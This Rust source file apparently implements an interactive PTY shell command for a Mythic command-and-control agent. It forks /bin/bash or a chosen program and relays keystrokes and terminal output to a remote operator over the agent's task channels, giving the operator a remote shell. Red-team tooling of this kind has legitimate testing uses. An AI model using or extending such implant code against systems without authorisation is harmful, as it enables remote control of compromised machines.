use crate::structs::{InteractiveTaskMessage, InteractiveTaskType, Task};
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use serde::Deserialize;
use std::os::fd::{AsRawFd, FromRawFd, IntoRawFd};
use tokio::io::{AsyncReadExt, AsyncWriteExt};

#[derive(Deserialize)]
struct PtyArgs {
    #[serde(default = "default_program")]
    program_path: String,
}

fn default_program() -> String { "/bin/bash".to_string() }

/// Map InteractiveTaskType to the corresponding terminal control byte.
fn control_byte(msg_type: InteractiveTaskType) -> Option<u8> {
    match msg_type {
        InteractiveTaskType::Escape => Some(0x1B),
        InteractiveTaskType::CtrlA => Some(0x01),
        InteractiveTaskType::CtrlB => Some(0x02),
        InteractiveTaskType::CtrlC => Some(0x03),
        InteractiveTaskType::CtrlD => Some(0x04),
        InteractiveTaskType::CtrlE => Some(0x05),
        InteractiveTaskType::CtrlF => Some(0x06),
        InteractiveTaskType::CtrlG => Some(0x07),
        InteractiveTaskType::Backspace => Some(0x08),
        InteractiveTaskType::Tab => Some(0x09),
        InteractiveTaskType::CtrlK => Some(0x0B),
        InteractiveTaskType::CtrlL => Some(0x0C),
        InteractiveTaskType::CtrlN => Some(0x0E),
        InteractiveTaskType::CtrlP => Some(0x10),
        InteractiveTaskType::CtrlQ => Some(0x11),
        InteractiveTaskType::CtrlR => Some(0x12),
        InteractiveTaskType::CtrlS => Some(0x13),
        InteractiveTaskType::CtrlU => Some(0x15),
        InteractiveTaskType::CtrlW => Some(0x17),
        InteractiveTaskType::CtrlY => Some(0x19),
        InteractiveTaskType::CtrlZ => Some(0x1A),
        _ => None,
    }
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: PtyArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(_) => PtyArgs { program_path: default_program() },
    };

    // Open PTY
    let pty = match nix::pty::openpty(None, None) {
        Ok(p) => p,
        Err(e) => {
            response.set_error(&format!("Failed to open PTY: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    // Fork and exec
    match unsafe { nix::unistd::fork() } {
        Ok(nix::unistd::ForkResult::Child) => {
            let _ = nix::unistd::setsid();
            unsafe {
                libc::ioctl(pty.slave.as_raw_fd(), libc::TIOCSCTTY as _, 0);
            }
            let _ = nix::unistd::dup2(pty.slave.as_raw_fd(), 0);
            let _ = nix::unistd::dup2(pty.slave.as_raw_fd(), 1);
            let _ = nix::unistd::dup2(pty.slave.as_raw_fd(), 2);
            let _ = nix::unistd::close(pty.master.as_raw_fd());
            let _ = nix::unistd::close(pty.slave.as_raw_fd());

            let path = std::ffi::CString::new(args.program_path.as_bytes()).unwrap();
            let _ = nix::unistd::execvp(&path, &[&path]);
            std::process::exit(1);
        }
        Ok(nix::unistd::ForkResult::Parent { child }) => {
            // Close slave side in parent
            drop(pty.slave);

            response.user_output = format!("PTY opened with PID {}", child);
            response.completed = false;
            let _ = task.job.send_responses.send(response).await;

            // Consume OwnedFd and dup for separate read/write
            let master_fd = pty.master.into_raw_fd();
            let write_fd = nix::unistd::dup(master_fd).expect("dup master fd");

            let mut master_read = unsafe { tokio::fs::File::from_raw_fd(master_fd) };
            let mut master_write = unsafe { tokio::fs::File::from_raw_fd(write_fd) };

            let output_tx = task.job.interactive_task_output_channel.clone();
            let task_id = task.data.task_id.clone();

            // Read from PTY → send to Mythic
            let read_handle = tokio::spawn({
                let task_id = task_id.clone();
                let output_tx = output_tx.clone();
                async move {
                    let mut buf = [0u8; 4096];
                    loop {
                        match master_read.read(&mut buf).await {
                            Ok(0) => break,
                            Ok(n) => {
                                let _ = output_tx.send(InteractiveTaskMessage {
                                    task_id: task_id.clone(),
                                    data: BASE64.encode(&buf[..n]),
                                    message_type: InteractiveTaskType::Output,
                                }).await;
                            }
                            Err(_) => break,
                        }
                    }
                }
            });

            // Write from Mythic → PTY
            let mut input_rx = task.job.interactive_task_input_channel;
            while let Some(msg) = input_rx.recv().await {
                if msg.message_type == InteractiveTaskType::Exit {
                    break;
                }

                // Decode the base64 data payload
                let data = match BASE64.decode(&msg.data) {
                    Ok(d) => d,
                    Err(e) => {
                        let _ = output_tx.send(InteractiveTaskMessage {
                            task_id: task_id.clone(),
                            data: BASE64.encode(format!("base64 decode error: {}\n", e).as_bytes()),
                            message_type: InteractiveTaskType::Error,
                        }).await;
                        continue;
                    }
                };

                let write_result = match msg.message_type {
                    InteractiveTaskType::Input => {
                        master_write.write_all(&data).await
                    }
                    InteractiveTaskType::Escape => {
                        // Send escape byte first, then any data
                        let mut r = master_write.write_all(&[0x1B]).await;
                        if r.is_ok() && !data.is_empty() {
                            r = master_write.write_all(&data).await;
                        }
                        r
                    }
                    InteractiveTaskType::Tab => {
                        // Write any prefix data first, then tab byte
                        let mut r = Ok(());
                        if !data.is_empty() {
                            r = master_write.write_all(&data).await;
                        }
                        if r.is_ok() {
                            r = master_write.write_all(&[0x09]).await;
                        }
                        r
                    }
                    other => {
                        // All other control characters
                        if let Some(byte) = control_byte(other) {
                            master_write.write_all(&[byte]).await
                        } else {
                            // Unknown type, write data as-is
                            if !data.is_empty() {
                                master_write.write_all(&data).await
                            } else {
                                Ok(())
                            }
                        }
                    }
                };

                if let Err(e) = write_result {
                    let _ = output_tx.send(InteractiveTaskMessage {
                        task_id: task_id.clone(),
                        data: BASE64.encode(format!("write error: {}\n", e).as_bytes()),
                        message_type: InteractiveTaskType::Error,
                    }).await;
                }
            }

            // Cleanup
            let _ = nix::sys::signal::kill(child, nix::sys::signal::SIGTERM);
            read_handle.abort();
            drop(master_write);

            let done_response = crate::structs::Response {
                task_id: task_id.clone(),
                completed: true,
                ..Default::default()
            };
            let _ = task.job.send_responses.send(done_response).await;
            let _ = task.remove_running_task.send(task_id).await;
        }
        Err(e) => {
            response.set_error(&format!("Fork failed: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
        }
    }
}
